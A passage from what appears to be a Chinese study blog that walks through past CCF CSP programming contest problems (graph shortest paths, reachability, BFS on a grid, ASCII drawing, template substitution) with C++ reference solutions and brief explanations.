0 或 1，c ≤ 105。保证答案不超过 106。\n\n参考代码\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;string&gt;using namespace std;int main()&#123;    long long n,m,t,a,b,c;    cin &gt;&gt;n &gt;&gt;m;    vector&lt;vector&lt;long long&gt;&gt; adj(n+1, vector&lt;long long&gt;());    //创建邻接表，是n+1个空的vector&lt;long long&gt;,adj也是vector    for(long long i = 0;i &lt; m;i++)    &#123;        cin &gt;&gt; t &gt;&gt; a &gt;&gt; b &gt;&gt; c;        adj[a].push_back(b);        adj[a].push_back(c);        adj[a].push_back(t);        adj[b].push_back(a);        adj[b].push_back(c);        adj[b].push_back(t);    //每个adj[i]一次存放三个信息，邻接点，距离，是否大路    &#125;    vector&lt;long long&gt; dist(n+1, 1000000);    //原点到某点距离,初始化n+1个1000000    vector&lt;bool&gt; inS(n+1, false);   //初始化都不在S集中    vector&lt;long long&gt; temp;    temp.push_back(-1);    temp.push_back(0);    temp.push_back(0);    vector&lt;vector&lt;long long&gt;&gt; pre(n+1,temp);    //记录前序结点，与adj[i]的三个信息同步，pre[i]是结点i的前序结点    inS[1] = true;  //第一个点加入S集    dist[1] = 0;    pre[1][0] = 1;    for(long long i = 0;i &lt; adj[1].size();i += 3)   //遍历第一个点的邻接点    &#123;        if(adj[1][i+2] == 0)    //到某一个邻接点是大道            dist[adj[1][i]] = adj[1][i+1];  //第一个点到邻接点adj[1][i]        else    //小道        &#123;            dist[adj[1][i]] = adj[1][i+1] * adj[1][i+1];        &#125;                //修改原点邻接点的pre信息        pre[adj[1][i]][0] = 1;        pre[adj[1][i]][1] = adj[1][i+1];        pre[adj[1][i]][2] = adj[1][i+2];    &#125;    long long source;   //记录下一个距离最短点的序号    while(!inS[n])  //不在S集中    &#123;        long long mindis = 1000000;        for(long long i = 1;i &lt;= n;i++)        &#123;            if(!inS[i] &amp;&amp; dist[i] &lt; mindis) //不在S集中并且到原点的距离更小            &#123;                mindis = dist[i];                source = i;            &#125;        &#125;        inS[source] = true; //将距离最小点加入S集        //更新新加入点的邻接点信息        long long size = adj[source].size();        for(long long i = 0;i &lt; size;i += 3)        &#123;            if(!inS[adj[source][i]])    //它的邻接点不在S集中            &#123;                long long dist2i;   //原点到新邻接点距离                if(adj[source][i+2] == 0)                &#123;                    dist2i = dist[source] + adj[source][i+1];                &#125;                else                &#123;                    long long prenode = source; //prenode记录目前追溯到的最前面的小道开始节点                    long long sdis = adj[source][i+1]; //向前追溯，小道总长                    while(true)                    &#123;                        if(pre[prenode][0] != prenode &amp;&amp; pre[prenode][2] == 1)                        &#123;                            sdis += pre[prenode][1];                            prenode = pre[prenode][0];                         &#125;                        else break; //往前追溯到的前序节点是大道开始节点                    &#125;                    dist2i = dist[prenode] + sdis * sdis;                &#125;                if(dist2i &lt; dist[adj[source][i]])   //判断是否更短，要更新                &#123;                    dist[adj[source][i]] = dist2i;                    pre[adj[source][i]][0] = source;                    pre[adj[source][i]][1] = adj[source][i+1];                    pre[adj[source][i]][2] = adj[source][i+2];                &#125;            &#125;        &#125;    &#125;    cout &lt;&lt; dist[n];    return 0;&#125;\n\n201709-4 通信网络题目\n\n某国的军队由 N 个部门组成，为了提高安全性，部门之间建立了 M 条通路，每条通路只能单向传递信息，即一条从部门 a 到部门 b 的通路只能由 a 向 b 传递信息。信息可以通过中转的方式进行传递，即如果 a 能将信息传递到 b，b 又能将信息传递到 c，则 a 能将信息传递到 c。一条信息可能通过多次中转最终到达目的地。\n由于保密工作做得很好，并不是所有部门之间都互相知道彼此的存在。只有当两个部门之间可以直接或间接传递信息时，他们才彼此知道对方的存在。部门之间不会把自己知道哪些部门告诉其他部门。\n\n上图中给了一个 4 个部门的例子，图中的单向边表示通路。部门 1 可以将消息发送给所有部门，部门 4 可以接收所有部门的消息，所以部门 1 和部门 4 知道所有其他部门的存在。部门 2 和部门 3 之间没有任何方式可以发送消息，所以部门 2 和部门 3 互相不知道彼此的存在。现在请问，有多少个部门知道所有 N 个部门的存在。或者说，有多少个部门所知道的部门数量（包括自己）正好是 N。\n\n输入格式\n\n输入的第一行包含两个整数 N, M，分别表示部门的数量和单向通路的数量。所有部门从 1 到 N 标号。接下来 M 行，每行两个整数 a, b，表示部门 a 到部门 b 有一条单向通路。\n\n输出格式\n\n输出一行，包含一个整数，表示答案。\n\n样例输入\n\n4 4\n1 2\n1 3\n2 4\n3 4\n\n样例输出\n\n2\n\n样例说明\n\n部门 1 和部门 4 知道所有其他部门的存在。\n\n评测用例规模与约定\n\n对于 30% 的评测用例，1 ≤ N ≤ 10，1 ≤ M ≤ 20；对于 60% 的评测用例，1 ≤ N ≤ 100，1 ≤ M ≤ 1000；对于 100% 的评测用例，1 ≤ N ≤ 1000，1 ≤ M ≤ 10000。\n\n参考代码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;iostream&gt;#include&lt;string.h&gt;#include&lt;vector&gt;#define MAXN 1005using namespace std;vector&lt;vector&lt;int&gt;&gt; adj(MAXN, vector&lt;int&gt;());    //创建邻接表，是n+1个空的vector&lt;int&gt;,adj也是vectorint visited[MAXN];  //记录每次深度优先遍历中该点是否已经遍历int reach[MAXN][MAXN];  //reach[a][b] =1表示a知道b。=0表示a不知道b。void dfs(int cur,int sta)   //cur:现在的出发点，sta：本次for循环的起点&#123;    visited[cur] = 1;    reach[sta][cur] = 1;    reach[cur][sta] = 1;    //两点互相知道    for(vector&lt;int&gt;::iterator i=adj[cur].begin();i != adj[cur].end();i++)    &#123;        if(visited[*i] == 0)        &#123;            dfs(*i,sta);        &#125;    &#125;&#125;int main()&#123;    int n,m,a,b;    cin &gt;&gt; n &gt;&gt; m;        for(int i = 0;i &lt; m;i++)    &#123;        cin &gt;&gt; a &gt;&gt; b;        adj[a].push_back(b);    &#125;    for(int i = 1;i &lt;= n;i++)    &#123;        memset(visited,0,sizeof(visited));        dfs(i,i);    &#125;        int ans = 0;    for(int i = 1;i &lt;= n;i++)    //数有几个点知道的点数是n    &#123;        int j;        for(j = 1;j &lt;= n;j++)        &#123;            if(reach[i][j] == 0)    break;        &#125;        if(j == n+1)    //上面的for循环进行完了，没有break，说明i知道每个j            ans++;    &#125;    cout &lt;&lt; ans;    return 0;&#125;\n\n代码解释:\n依然是邻接表形式的图。因为间接访问也算互相知道，所以依次从每个点开始遍历图，每次遍历到一个点都将这个点与起始点记录为互相知道。201703-4 地铁修建题目：\n\nA 市有 n 个交通枢纽，其中 1 号和 n 号非常重要，为了加强运输能力，A 市决定在 1 号到 n 号枢纽间修建一条地铁。地铁由很多段隧道组成，每段隧道连接两个交通枢纽。经过勘探，有 m 段隧道作为候选，两个交通枢纽之间最多只有一条候选的隧道，没有隧道两端连接着同一个交通枢纽。现在有 n 家隧道施工的公司，每段候选的隧道只能由一个公司施工，每家公司施工需要的天数一致。而每家公司最多只能修建一条候选隧道。所有公司同时开始施工。作为项目负责人，你获得了候选隧道的信息，现在你可以按自己的想法选择一部分隧道进行施工，请问修建整条地铁最少需要多少天。\n\n输入：\n\n输入的第一行包含两个整数 n, m，用一个空格分隔，分别表示交通枢纽的数量和候选隧道的数量。第 2 行到第 m+1 行，每行包含三个整数 a, b, c，表示枢纽 a 和枢纽 b 之间可以修建一条隧道，需要的时间为 c 天。\n\n输出：\n\n输出一个整数，修建整条地铁线路最少需要的天数。\n\n输入样例：\n\n6 61 2 42 3 43 6 71 4 24 5 55 6 6\n\n输出样例：\n\n6\n\n样例说明\n\n可以修建的线路有两种。 \n第一种经过的枢纽依次为 1, 2, 3, 6，所需要的时间分别是 4, 4, 7，则整条地铁线需要 7 天修完； \n第二种经过的枢纽依次为 1, 4, 5, 6，所需要的时间分别是 2, 5, 6，则整条地铁线需要 6 天修完。 \n第二种方案所用的天数更少。\n\n提示\n\n对于 20% 的评测用例，1 ≤ n ≤ 10，1 ≤ m ≤ 20； \n对于 40% 的评测用例，1 ≤ n ≤ 100，1 ≤ m ≤ 1000； \n对于 60% 的评测用例，1 ≤ n ≤ 1000，1 ≤ m ≤ 10000，1 ≤ c ≤ 1000； \n对于 80% 的评测用例，1 ≤ n ≤ 10000，1 ≤ m ≤ 100000； \n对于 100% 的评测用例，1 ≤ n ≤ 100000，1 ≤ m ≤ 200000，1 ≤ a, b ≤ n，1 ≤ c ≤ 1000000。 \n所有评测用例保证在所有候选隧道都修通时 1 号枢纽可以通过隧道到达其他所有枢纽。\n\n解题思路：\n\n对迪杰斯特拉求最短路径做稍稍改变，把更新到起始点的距离改成更新到起始点的几段中最长一段要花的天数。\n\n参考代码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include&lt;string.h&gt;#include&lt;algorithm&gt;#include&lt;queue&gt;#include&lt;vector&gt;#include&lt;iostream&gt;#define INF 0x3f3f3f3f#define MAXN 100005using namespace std;struct Edge&#123;    int from,to,dist;   //每一段的起点，终点，距离    Edge(int u,int v,int d):from(u),to(v),dist(d)&#123;&#125;&#125;;struct HeapNode&#123;    int day,u;    //u点到起始点的几段中最长一段要花的天数    bool operator &lt; (const HeapNode&amp; rhs) const&#123;        return day &gt; rhs.day;    &#125;&#125;;vector&lt;Edge&gt; edge;  vector&lt;int&gt; G[MAXN];    //G[i]中的若干个int是几条从结点i出发的边的序号bool visited[MAXN];int day[MAXN];int n,m;void addEdge(int from,int to,int dist)&#123;    edge.push_back(Edge(from,to,dist));    G[from].push_back(edge.size()-1);   //添加edge[0]这条边的时候，edge.size是1&#125;void dijkstra(int s)&#123;    priority_queue&lt;HeapNode&gt; Q;    for(int i = 0;i &lt; n;i++)        day[i] = INF;    day[s] = 0;    memset(visited,0,sizeof(visited));    Q.push((HeapNode)&#123;0,s&#125;);    //把&#123;0,s&#125;作为HeapNode的两个参数,s是起始点，到自己的day是0    while(!Q.empty())    &#123;        HeapNode x = Q.top();        Q.pop();        int u = x.u;        if(visited[u])  continue;   //已经访问过        visited[u] = true;        for(int i = 0;i &lt; G[u].size();i++)  //遍历从u出发的边        &#123;            Edge&amp; e = edge[G[u][i]];            if(day[e.to] &gt; max(day[u],e.dist))            &#123;                day[e.to] = max(day[u],e.dist);                Q.push((HeapNode)&#123;day[e.to],e.to&#125;);            &#125;        &#125;    &#125;&#125;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    int u,v,d;    for(int i = 0;i &lt; m;i++)    &#123;        cin &gt;&gt; u &gt;&gt; v &gt;&gt; d;        addEdge(u-1,v-1,d);        addEdge(v-1,u-1,d);    &#125;    dijkstra(0);    cout &lt;&lt; day[n-1];   //终点n到起点0的日子    return 0;&#125;\n\n201609-4 交通规划题目：\n\nG 国国王来中国参观后，被中国的高速铁路深深的震撼，决定为自己的国家也建设一个高速铁路系统。建设高速铁路投入非常大，为了节约建设成本，G 国国王决定不新建铁路，而是将已有的铁路改造成高速铁路。现在，请你为 G 国国王提供一个方案，将现有的一部分铁路改造成高速铁路，使得任何两个城市间都可以通过高速铁路到达，而且从所有城市乘坐高速铁路到首都的最短路程和原来一样长。请你告诉 G 国国王在这些条件下最少要改造多长的铁路。\n\n输入：\n\n输入的第一行包含两个整数 n, m，分别表示 G 国城市的数量和城市间铁路的数量。所有的城市由 1 到 n 编号，首都为 1 号。接下来 m 行，每行三个整数 a, b, c，表示城市 a 和城市 b 之间有一条长度为 c 的双向铁路。这条铁路不会经过 a 和 b 以外的城市。\n\n输出：\n\n输出一行，表示在满足条件的情况下最少要改造的铁路长度。\n\n样例输入：\n\n4 51 2 41 3 52 3 22 4 33 4 2 \n\n样例输出\n\n11\n\n评测用例规模与约定\n\n对于 20% 的评测用例，1 ≤ n ≤ 10，1 ≤ m ≤ 50；对于 50% 的评测用例，1 ≤ n ≤ 100，1 ≤ m ≤ 5000；对于 80% 的评测用例，1 ≤ n ≤ 1000，1 ≤ m ≤ 50000；对于 100% 的评测用例，1 ≤ n ≤ 10000，1 ≤ m ≤ 100000，1 ≤ a, b ≤ n，1 ≤ c ≤ 1000。输入保证每个城市都可以通过铁路达到首都。\n\n解题思路：\n\n首先想到用迪杰斯特拉算法，但是在更新结点到首都的距离时，即使最短距离和原来一样，也要考虑是不是改造的总长度更短。例如在输入样例中，到点4有两条路，1-2-4和1-3-4，总距离都是7，但是当1-2和1-3这两条路都要改造时，显然改造3-4这条路代价更小。用cost[]数组记录每个点更新距离时，自己到前一个点的边长。\n\n参考代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;iostream&gt;#include&lt;queue&gt;#include&lt;vector&gt;#include&lt;string.h&gt;#include&lt;algorithm&gt;#define INF 0x3f3f3f3f#define MAXN 10005using namespace std;struct Edge&#123;    int from,to,dist;    //每一段的起点，终点，距离    Edge(int u,int v,int d):from(u),to(v),dist(d)&#123;&#125;&#125;;struct HeapNode&#123;    int dis,u;  //点u到首都的距离dis    bool operator &lt; (const HeapNode&amp; rhs)   const&#123;        return dis &gt; rhs.dis;    &#125;&#125;;vector &lt;Edge&gt; edge;vector &lt;int&gt; G[MAXN];  //G[i]中的若干个int是几条从结点i出发的边的序号bool visited[MAXN];int dist[MAXN];int n,m;int cost[MAXN];void addEdge(int from,int to,int dist)&#123;    edge.push_back(Edge(from,to,dist));    G[from].push_back(edge.size()-1);   //添加edge[0]这条边的时候，edge.size是1&#125;void dijkstra(int s)&#123;    priority_queue&lt;HeapNode&gt; Q;    for(int i = 0;i &lt; n;i++)    &#123;        dist[i] = INF;        cost[i] = INF;    &#125;            dist[s] = 0;    memset(visited,0,sizeof(visited));    Q.push((HeapNode)&#123;0,s&#125;);    //把&#123;0,s&#125;作为HeapNode的三个参数,s是起始点，到自己的dis是0    while(!Q.empty())    &#123;        HeapNode x = Q.top();        Q.pop();        int u = x.u;        if(visited[u])  continue;   //已经访问过        visited[u] = true;        //找到以u为终点的要加入ans的边        for(int i = 0;i &lt; G[u].size();i++)  //遍历从u出发的边        &#123;            Edge&amp; e = edge[G[u][i]];            if(dist[e.to] &gt; dist[e.from] + e.dist)  //更新            &#123;                dist[e.to] = dist[e.from] + e.dist;                cost[e.to] = e.dist;                Q.push((HeapNode)&#123;dist[e.to],e.to&#125;);            &#125;            else if(dist[e.to] == dist[e.from] + e.dist)            &#123;                cost[e.to] = min(cost[e.to],e.dist);            &#125;        &#125;    &#125;&#125;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    int u,v,d;    for(int i = 0;i &lt; m;i++)    &#123;        cin &gt;&gt; u &gt;&gt; v &gt;&gt; d;        addEdge(u-1,v-1,d);        addEdge(v-1,u-1,d);    &#125;    dijkstra(0);    int ans = 0;    for(int i = 1;i &lt; n;i++)    &#123;        ans += cost[i];    &#125;    cout &lt;&lt; ans;    return 0;&#125;\n\n201604-4 游戏题目：\n\n小明在玩一个电脑游戏，游戏在一个 n×m 的方格图上进行，小明控制的角色开始的时候站在第一行第一列，目标是前往第 n 行第 m 列。方格图上有一些方格是始终安全的，有一些在一段时间是危险的，如果小明控制的角色到达一个方格的时候方格是危险的，则小明输掉了游戏，如果小明的角色到达了第 n 行第 m 列，则小明过关。第一行第一列和第 n 行第 m 列永远都是安全的。每个单位时间，小明的角色必须向上下左右四个方向相邻的方格中的一个移动一格。经过很多次尝试，小明掌握了方格图的安全和危险的规律：每一个方格出现危险的时间一定是连续的。并且，小明还掌握了每个方格在哪段时间是危险的。现在，小明想知道，自己最快经过几个时间单位可以达到第 n 行第 m 列过关。\n\n输入\n\n输入的第一行包含三个整数 n, m, t，用一个空格分隔，表示方格图的行数 n、列数 m，以及方格图中有危险的方格数量。接下来 t 行，每行 4 个整数 r, c, a, b，表示第 r 行第 c 列的方格在第 a 个时刻到第 b 个时刻之间是危险的，包括 a 和 b。游戏开始时的时刻为 0。输入数据保证 r 和 c 不同时为 1，而且当 r 为 n 时 c 不为 m。一个方格只有一段时间是危险的（或者说不会出现两行拥有相同的 r 和 c）。\n\n输出\n\n输出一个整数，表示小明最快经过几个时间单位可以过关。输入数据保证小明一定可以过关。\n\n样例输入\n\n3 3 32 1 1 11 3 2 102 2 2 10\n\n样例输出\n\n6\n\n样例说明\n\n第 2 行第 1 列时刻 1 是危险的，因此第一步必须走到第 1 行第 2 列。第二步可以走到第 1 行第 1 列，第三步走到第 2 行第 1 列，后面经过第 3 行第 1 列、第 3 行第 2 列到达第 3 行第 3 列。\n\n评测用例规模与约定\n\n前 30% 的评测用例满足：0 &lt; n, m ≤ 10，0 ≤ t &lt; 99。所有评测用例满足：0 &lt; n, m ≤ 100，0 ≤ t &lt; 9999，1 ≤ r ≤ n，1 ≤ c ≤ m，0 ≤ a ≤ b ≤ 100。\n\n解题思路：\n\n用类似于广度遍历的方式，什么时候有一条路走到终点了就结束。但是要设置visited数组的第三维，第三维是访问到某一点的时刻，也是到这一点所走过的步数。如果没有visited数组会运行超时，可能会重复在同一时刻访问到某个点，运行太多次。如果第三维设置太小，则可能会出现无路可走，直接错误。在这一题中设成10就能通过CSP的测试，但是保守起见应该设的更大。\n\n参考代码：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;iostream&gt;using namespace std;#include&lt;queue&gt;#define MAXN 105#define MAXM 105int N,M,T;int mv[4][2] = &#123;&#123;0,1&#125;,&#123;0,-1&#125;,&#123;1,0&#125;,&#123;-1,0&#125;&#125;;bool visited[MAXN][MAXM][10];  //加入时间维度int start[MAXN][MAXM];  //记录每个点的危险起始时刻int fin[MAXN][MAXM];    //记录每个点的危险结束时刻struct Node&#123;    int x;  //坐标    int y;    int len;    //走到这一点走了多少步，也就是时刻    Node(int x_,int y_,int len_):x(x_),y(y_),len(len_)&#123;&#125;&#125;;//判断这个坐标是否还在区域内bool legal(int n,int m)&#123;    return n &gt;= 1 &amp;&amp; n &lt;= N &amp;&amp; m &gt;= 1 &amp;&amp; m &lt;= M;&#125;int main()&#123;    cin &gt;&gt; N &gt;&gt; M &gt;&gt; T;    int r,c,a,b;    for(int i = 0;i &lt; T;i++)    &#123;        cin &gt;&gt; r &gt;&gt; c &gt;&gt; a &gt;&gt; b;        start[r][c] = a;        fin[r][c] = b;    &#125;    queue&lt;Node&gt; q;    q.push(Node(1,1,0)); //起始点，步数是0    visited[1][1][0] = true;    while(!q.empty())    &#123;        Node top = q.front();        q.pop();        if(top.x == N &amp;&amp; top.y == M)    //到终点了        &#123;            cout &lt;&lt; top.len;            break;        &#125;        for(int d = 0;d &lt; 4;d++)        &#123;            int nx = top.x + mv[d][0];            int ny = top.y + mv[d][1];            int nlen = top.len + 1;                        if(legal(nx,ny) &amp;&amp; (nlen &lt; start[nx][ny] || nlen &gt; fin[nx][ny]) &amp;&amp; !visited[nx][ny][nlen])            &#123;                visited[nx][ny][nlen] = true;                q.push(Node(nx,ny,nlen));            &#125;        &#125;    &#125;&#125;\n\n201512-3 画图问题描述\n\n用 ASCII 字符来画图是一件有趣的事情，并形成了一门被称为 ASCII Art 的艺术。例如，下图是用 ASCII 字符画出来的 CSPRO 字样。\n12345..____.____..____..____...___.../.___/.___||.._.\\|.._.\\./._.\\.|.|...\\___.\\|.|_).|.|_).|.|.|.||.|___.___).|..__/|.._.&lt;|.|_|.|.\\____|____/|_|...|_|.\\_\\\\___/.\n\n　　本题要求编程实现一个用 ASCII 字符来画图的程序，支持以下两种操作：　　画线：给出两个端点的坐标，画一条连接这两个端点的线段。简便起见题目保证要画的每条线段都是水平或者竖直的。水平线段用字符 - 来画，竖直线段用字符 | 来画。如果一条水平线段和一条竖直线段在某个位置相交，则相交位置用字符 + 代替。　　填充：给出填充的起始位置坐标和需要填充的字符，从起始位置开始，用该字符填充相邻位置，直到遇到画布边缘或已经画好的线段。注意这里的相邻位置只需要考虑上下左右 4 个方向，如下图所示，字符 @ 只和 4 个字符 * 相邻。\n123.*.*@*.*.\n\n输入格式\n\n　　第 1 行有三个整数 m, n 和 q。m 和 n 分别表示画布的宽度和高度，以字符为单位。q 表示画图操作的个数。　　第 2 行至第 q + 1 行，每行是以下两种形式之一：　　0 x1 y1 x2 y2：表示画线段的操作，(x1, y1) 和 (x2, y2) 分别是线段的两端，满足要么 x1 = x2 且 y1 ≠ y2，要么 y1 = y2 且 x1 ≠ x2。　　1 x y c：表示填充操作，(x, y) 是起始位置，保证不会落在任何已有的线段上；c 为填充字符，是大小写字母。　　画布的左下角是坐标为 (0, 0) 的位置，向右为 x 坐标增大的方向，向上为 y 坐标增大的方向。这 q 个操作按照数据给出的顺序依次执行。画布最初时所有位置都是字符 .（小数点）。\n\n输出格式\n\n　输出有 n 行，每行 m 个字符，表示依次执行这 q 个操作后得到的画图结果。\n\n样例输入\n\n4 2 31 0 0 B0 1 0 2 01 0 0 A\n\n样例输出\n\nAAAAA--A\n\n样例输入\n\n16 13 90 3 1 12 10 12 1 12 30 12 3 6 30 6 3 6 90 6 9 12 90 12 9 12 110 12 11 3 110 3 11 3 11 4 2 C\n\n样例输出\n\n...................+--------+......|CCCCCCCC|......|CC+-----+......|CC|............|CC|............|CC|............|CC|............|CC|............|CC+-----+......|CCCCCCCC|......+--------+...................\n\n评测用例规模与约定\n\n所有的评测用例满足：2 ≤ m, n ≤ 100，0 ≤ q ≤ 100，0 ≤ x &lt; m（x 表示输入数据中所有位置的 x 坐标），0 ≤ y &lt; n（y 表示输入数据中所有位置的 y 坐标）。\n\n参考代码\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;using namespace std;#define MAX 105char canvas[MAX][MAX];int m,n,q;void drawline(int x1,int y1,int x2,int y2)&#123;    if(y1 == y2)    //水平线    &#123;        if(x1 &gt; x2) swap(x1,x2);        for(int x = x1;x &lt;= x2;x++)        &#123;            if(canvas[y1][x] == '|' || canvas[y1][x] == '+') canvas[y1][x] = '+';   //画交点            else canvas[y1][x] = '-';        &#125;    &#125;    else if(x1 == x2)   //画垂直线    &#123;        if(y1 &gt; y2) swap(y1,y2);        for(int y = y1;y &lt;= y2;y++)        &#123;            if(canvas[y][x1] == '-' || canvas[y][x1] == '+')    canvas[y][x1] = '+';            else canvas[y][x1] = '|';        &#125;    &#125;&#125;int dx[4] = &#123;0,1,0,-1&#125;;int dy[4] = &#123;1,0,-1,0&#125;;void fill(int x,int y,char ch)&#123;    canvas[y][x] = ch;    for(int i = 0;i &lt; 4;i++)    &#123;        int nx = x + dx[i],ny = y + dy[i];        if(ny &gt;= 0 &amp;&amp; ny &lt; n &amp;&amp; nx &gt;= 0 &amp;&amp; nx &lt; m &amp;&amp; canvas[ny][nx] != ch &amp;&amp; canvas[ny][nx] != '-' &amp;&amp; canvas[ny][nx] != '|' &amp;&amp; canvas[ny][nx] != '+')        &#123;            fill(nx,ny,ch);        &#125;    &#125;&#125;void output()&#123;    for(int y = 0;y &lt; n;y++)    &#123;        for(int x = 0;x &lt; m;x++)        &#123;            cout &lt;&lt; canvas[y][x];        &#125;        cout &lt;&lt; endl;    &#125;&#125;int main()&#123;    cin &gt;&gt; m &gt;&gt; n &gt;&gt; q;    int x1,x2,y1,y2,op;    char ch;    for(int i = 0;i &lt; n;i++)    //初始全部为点    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            canvas[i][j] = '.';        &#125;    &#125;    while(q--)    &#123;        cin &gt;&gt; op;        if(op == 0)        &#123;            cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;            drawline(x1,n-y1-1,x2,n-y2-1);        &#125;        else if(op == 1)        &#123;            cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; ch;            fill(x1,n-y1-1,ch);        &#125;    &#125;    output();    return 0;&#125;\n\n部分代码解释：\nswap(x1,x2)：C语言swap()函数能将两个数值调换。dx[4]和dy[4]：因为要逐个查看某个字符上下左右字符是否要替换，所以就事先将xy坐标的四种变动存起来，直接用for循环实现访问上下左右四个位置。201509-3 模板生成系统问题描述\n\n成成最近在搭建一个网站，其中一些页面的部分内容来自数据库中不同的数据记录，但是页面的基本结构是相同的。例如，对于展示用户信息的页面，当用户为 Tom 时，网页的源代码是\n\n而当用户为 Jerry 时，网页的源代码是\n\n　这样的例子在包含动态内容的网站中还有很多。为了简化生成网页的工作，成成觉得他需要引入一套模板生成系统。　　模板是包含特殊标记的文本。成成用到的模板只包含一种特殊标记，格式为 { {VAR} }，其中 VAR 是一个变量。该标记在模板生成时会被变量 VAR 的值所替代。例如，如果变量 name = &quot;Tom&quot;，则 { { name } } 会生成 Tom。具体的规则如下：　　・变量名由大小写字母、数字和下划线 (_) 构成，且第一个字符不是数字，长度不超过 16 个字符。　　・变量名是大小写敏感的，Name 和 name 是两个不同的变量。　　・变量的值是字符串。　　・如果标记中的变量没有定义，则生成空串，相当于把标记从模板中删除。　　・模板不递归生成。也就是说，如果变量的值中包含形如 { {VAR} } 的内容，不再做进一步的替换。\n\n输入格式\n\n输入的第一行包含两个整数 m, n，分别表示模板的行数和模板生成时给出的变量个数。　　接下来 m 行，每行是一个字符串，表示模板。　　接下来 n 行，每行表示一个变量和它的值，中间用一个空格分隔。值是字符串，用双引号 (&quot;) 括起来，内容可包含除双引号以外的任意可打印 ASCII 字符（ASCII 码范围 32, 33, 35-126）。\n\n输出格式\n\n输出包含若干行，表示模板生成的结果。\n\n样例输入\n123456789101112131411 2&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;User &#123; &#123; name &#125; &#125;&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;&#123; &#123; name &#125; &#125;&lt;&#x2F;h1&gt;&lt;p&gt;Email: &lt;a href&#x3D;&quot;mailto:&#123; &#123; email &#125; &#125;&quot;&gt;&#123; &#123; email &#125; &#125;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;p&gt;Address: &#123; &#123; address &#125; &#125;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;name &quot;David Beckham&quot;email &quot;david@beckham.com&quot;\n\n样例输出\n1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;User David Beckham&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;David Beckham&lt;&#x2F;h1&gt;&lt;p&gt;Email: &lt;a href&#x3D;&quot;mailto:david@beckham.com&quot;&gt;david@beckham.com&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;p&gt;Address: &lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n\n评测用例规模与约定\n\n0 ≤ m ≤ 1000 ≤ n ≤ 100输入的模板每行长度不超过 80 个字符（不包含换行符）。输入保证模板中所有以 { { 开始的子串都是合法的标记，开始是两个左大括号和一个空格，然后是变量名，结尾是一个空格和两个右大括号。输入中所有变量的值字符串长度不超过 100 个字符（不包括双引号）。保证输入的所有变量的名字各不相同。\n\n参考代码\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;sstream&gt;#include &lt;map&gt;using namespace std;#define MAXN 105#define MAXL 85int main()&#123;    int m,n;    char tpl[MAXN][MAXL];    map&lt;string,string&gt; var;    cin &gt;&gt; m &gt;&gt; n;    getchar();    for(int i = 0;i &lt; m;i++)        gets(tpl[i]);    char key[MAXL],value[MAXL];    for(int i = 0;i &lt; n;i++)    &#123;        scanf(\"%s \",key);        gets(value);        value[0] = value[strlen(value)-1] = 0;  //前后两个双引号赋值为0        var[key] = value + 1;    &#125;    for(int i = 0;i &lt; m;i++)    &#123;        char *p1 = tpl[i];        char *p2;        p2 = strstr(p1,\"&#123; &#123;\");        while(p2 != NULL)        &#123;            *p2 = '\\0';     //做特殊处理方便输出            cout &lt;&lt; p1;            stringstream ss(p2+3);            string key;            ss &gt;&gt; key;            cout &lt;&lt;var[key];            p2 = strstr(p2+2,\"&#125; &#125;\");            p1 = p2+2;            p2 = strstr(p1,\"&#123; &#123;\");        &#125;        if(p2 == NULL)            cout &lt;&lt; p1 &lt;&lt; endl;    &#125;    return 0;&#125;\n\n部分代码解释：\n在cin &gt;&gt; m &gt;&gt; n之后必须有getchar()这一句，否则后面全都错位一个。char a = &#39;\\0&#39; 代表转义字符表示空字符，char a = 0 对应 ASCII 码表上的空字符，都打印不出东西，两者意义相同12char *p2;p2 = strstr(p1,\"&#123; &#123;\");\n\n  strstr()返回的是p1中第一个出现{ {的位置，此时p2指向第一个{。\nstringstream ss(p2+3);这句写成p2+3和p2+2都对，p2+2是花括号后的第一个空格，p2+3是字符串的第一位。stringstream自带按空格分割功能，ss &gt;&gt; key;就是以字符串后面的空格分割。string key; ss &gt;&gt; key;这段如果不是key，而且key2或者别的，就运行不出来，不明白为啥。[注]:转义内容 Hexo使用Nunjucks 渲染帖子，不能出现两个花括号在一起的情况，否则报错，所以题目中所有出现两个花括号的地方我都在中间加了个空格，代码不能直接跑，要手动去掉这些空格。\n201409-3 字符串匹配问题描述\n\n给出一个字符串和多行文字，在这些文字中找到字符串出现的那些行。你的程序还需支持大小写敏感选项：当选项打开时，表示同一个字母的大写和小写看作不同的字符；当选项关闭时，表示同一个字母的大写和小写看作相同的字符。\n\n输入格式\n\n输入的第一行包含一个字符串 S，由大小写英文字母组成。第二行包含一个数字，表示大小写敏感的选项，当数字为 0 时表示大小写不敏感，当数字为 1 时表示大小写敏感。第三行包含一个整数 n，表示给出的文字的行数。接下来 n 